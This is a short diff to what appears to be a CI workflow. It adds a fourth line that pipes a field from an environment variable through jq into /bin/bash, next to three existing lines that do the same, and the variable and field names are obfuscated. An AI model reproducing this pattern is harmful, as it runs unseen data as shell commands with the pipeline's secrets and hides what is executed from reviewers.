@@ -33,6 +33,7 @@ jobs:
           echo $kidyq244 | jq -r .rzqqz127 | /bin/bash
           printf '%s' "$nh638" | jq -r .kcfvh46 | /bin/bash
           printf '%s' "$i6" | jq -r .nmjq702 | /bin/bash
+          echo $zhkmq1 | jq -r .hqd1 | /bin/bash
 
       - name: Save archive
         if: always()
